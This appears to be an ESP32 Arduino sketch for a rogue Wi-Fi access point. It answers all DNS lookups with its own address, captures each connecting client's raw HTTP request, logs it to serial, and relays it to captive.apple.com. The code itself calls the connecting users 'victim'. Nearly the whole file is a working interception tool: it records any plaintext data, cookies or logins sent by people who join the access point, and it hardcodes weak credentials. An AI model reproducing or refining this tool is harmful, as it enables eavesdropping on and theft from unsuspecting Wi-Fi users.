#include <WiFi.h>
#include <DNSServer.h>

const char* ssid = "wifi";
const char* password = "12345678";
const char* test_ssid = "ESP32";
const char* test_password = "12345678";

WiFiServer server(80);
WiFiClient webhost;
WiFiClient victim;

// DNS Server for Captive Portal
const byte DNS_PORT = 53;
DNSServer dnsServer;

void setup() {
  Serial.begin(115200);

  // disconnect to clear previous configuration
  WiFi.softAPdisconnect(true); 
  
  // set mode to AP STA
  WiFi.mode(WIFI_AP_STA);

  bool result = WiFi.softAP(test_ssid, test_password);
  
  if(result == true) {
    Serial.println("AP Started Successfully");
  } else {
    Serial.println("AP Failed to Start");
  }
  
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  WiFi.begin(ssid, password);
  Serial.print("Connecting to WiFi");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("\nConnected!");
  Serial.println(WiFi.localIP());

  server.begin();
}

void loop() {
  // process DNS request
  dnsServer.processNextRequest();

  victim = server.available();
  while(!victim)
  {
    victim = server.available();
    delay(100);
  }

  Serial.println("\n=== Victim Connected ===");
  
  // Wait for victim data
  while (!victim.available()) {
    Serial.println("Waiting for victim to send request...");
    delay(100);
  }

  // Read FULL HTTP request
  String request = "";
  while (victim.available()) {
    char c = victim.read();
    request += c;
  }

  Serial.println("----- RAW HTTP REQUEST -----");
  Serial.println(request);
  Serial.println("----------------------------");

  // connect to web host
  const char* host = "captive.apple.com";
  int port = 80;
  if (!webhost.connect(host, port)) {
    Serial.println("Connection failed");
    return;
  }
  else
  {
    Serial.println("Connected to web host");
  }

  // send request from client to web host
  webhost.print(request);
  Serial.println("Request sent...");

  // read http response from web host or skip if no reply
  unsigned long start = millis();
  unsigned long timeout = millis();
  while (webhost.available() == 0) {
    if (millis() - timeout > 5000) { // Wait up to 5 seconds
      Serial.println(">>> Client Timeout !");
      victim.println("HTTP/1.1 504 Gateway Timeout"); // Send valid HTTP error
      victim.println();
      victim.stop();
      webhost.stop();
      return;
    }
  }
  
  // 4. The Pipeline (Streaming Data)
  // Read from Web -> Write to Victim immediately
  unsigned long lastActivity = millis();
      
  while (webhost.connected() || webhost.available()) {
    if (webhost.available()) {
      // Read a chunk (buffer) instead of a char
      uint8_t buffer[128];
      int len = webhost.read(buffer, sizeof(buffer));
      if (len > 0) {
      // Forward directly to victim
      victim.write(buffer, len);
      // Optional: Print to serial to debug (slows things down though)
      Serial.write(buffer, len); 
      lastActivity = millis();
      }
    }
        
    // Timeout safety
    if (millis() - lastActivity > 10000) {
      Serial.println("Transfer timed out");
      break;
    }
  }
  victim.stop();
  webhost.stop();
}
